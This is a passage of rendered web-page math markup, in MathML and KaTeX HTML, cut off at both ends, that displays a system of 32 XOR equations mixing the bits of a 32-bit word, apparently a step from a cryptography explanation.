displaystyle="false"><mrow><msub><mi>a</mi><mn>27</mn></msub><mo>=</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>28</mn></msub><mo>=</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>29</mn></msub><mo>=</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>30</mn></msub><mo>=</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>31</mn></msub><mo>=</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} a_{0} = b_{0} \oplus b_{11} \oplus b_{15} \\ a_{1} = b_{1} \oplus b_{12} \oplus b_{16} \\ a_{2} = b_{2} \oplus b_{13} \oplus b_{17} \\ a_{3} = b_{3} \oplus b_{14} \oplus b_{18} \\ a_{4} = b_{4} \oplus b_{15} \oplus b_{19} \\ a_{5} = b_{5} \oplus b_{16} \oplus b_{20} \\ a_{6} = b_{6} \oplus b_{17} \oplus b_{21} \\ a_{7} = b_{7} \oplus b_{18} \oplus b_{22} \\ a_{8} = b_{8} \oplus b_{19} \oplus b_{23} \\ a_{9} = b_{9} \oplus b_{20} \oplus b_{24} \\ a_{10} = b_{10} \oplus b_{21} \oplus b_{25} \\ a_{11} = b_{11} \oplus b_{22} \oplus b_{26} \\ a_{12} = b_{12} \oplus b_{23} \oplus b_{27} \\ a_{13} = b_{13} \oplus b_{24} \oplus b_{28} \\ a_{14} = b_{14} \oplus b_{25} \oplus b_{29} \\ a_{15} = b_{15} \oplus b_{26} \oplus b_{30} \\ a_{16} = b_{16} \oplus b_{27} \oplus b_{31} \\ a_{17} = b_{17} \oplus b_{28} \oplus b_{0} \\ a_{18} = b_{18} \oplus b_{29} \oplus b_{1} \\ a_{19} = b_{19} \oplus b_{30} \oplus b_{2} \\ a_{20} = b_{20} \oplus b_{31} \oplus b_{3} \\ a_{21} = b_{21} \oplus b_{0} \oplus b_{4} \\ a_{22} = b_{22} \oplus b_{1} \oplus b_{5} \\ a_{23} = b_{23} \oplus b_{2} \oplus b_{6} \\ a_{24} = b_{24} \oplus b_{3} \oplus b_{7} \\ a_{25} = b_{25} \oplus b_{4} \oplus b_{8} \\ a_{26} = b_{26} \oplus b_{5} \oplus b_{9} \\ a_{27} = b_{27} \oplus b_{6} \oplus b_{10} \\ a_{28} = b_{28} \oplus b_{7} \oplus b_{11} \\ a_{29} = b_{29} \oplus b_{8} \oplus b_{12} \\ a_{30} = b_{30} \oplus b_{9} \oplus b_{13} \\ a_{31} = b_{31} \oplus b_{10} \oplus b_{14} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:46.080000000000034em;vertical-align:-22.790000000000013em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:23.050020000000053em;"><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:18.200010000000002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.90001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.60001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.30001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.00001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.70001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.400009999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.100009999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.800009999999995em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.500009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.200009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.900009999999993em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.600009999999992em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.300009999999991em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.00000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.70000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.40000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.100009999999989em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.800009999999988em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.500009999999987em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.200009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.900009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.600009999999985em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.300009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.000009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.700009999999983em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.400009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.100009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.80000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.50000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.20000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.900009999999979em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.600009999999978em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.300009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.000009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.700009999999976em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.400009999999975em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.100009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.800009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.500009999999973em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.200009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.9000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.600009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.30000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.000009999999969em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.7000099999999705em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.40000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.100009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.8000099999999706em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.5000099999999708em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.200009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.900009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.6000099999999713em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.3000099999999715em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.0000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.7000099999999718em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.400009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.1000099999999722em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.8000099999999724em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.5000099999999725em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.2000099999999727em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.09999000000002711em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.39999000000002694em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.6999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.9999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.2999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.5999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.8999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.1999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.150010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.300010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.600010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.900010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.200010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.500010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.800010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.700010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.000010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.300010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.600010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.900010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.200010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.100010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.400010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.700010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.000010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.300010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.600010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.900010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.200010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.700010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.000010000000028em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.300010000000029em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.60001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.90001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.20001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.500010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.800010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.100010000000033em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.400010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.700010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.000010000000035em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.300010000000036em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.600010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.900010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.200010000000038em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.50001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.80001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.10001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.40001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.70001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.000010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.30001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.60001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.90001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.20001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.500010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.800010000000043em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.100010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.400010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.700010000000045em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.000010000000046em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.300010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.600010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.900010000000048em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.20001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.50001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.80001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.10001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.40001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.700010000000052em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.000010000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.300020000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:23.29000000000002em;"><span style="top:-25.290000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-23.850000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-22.410000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 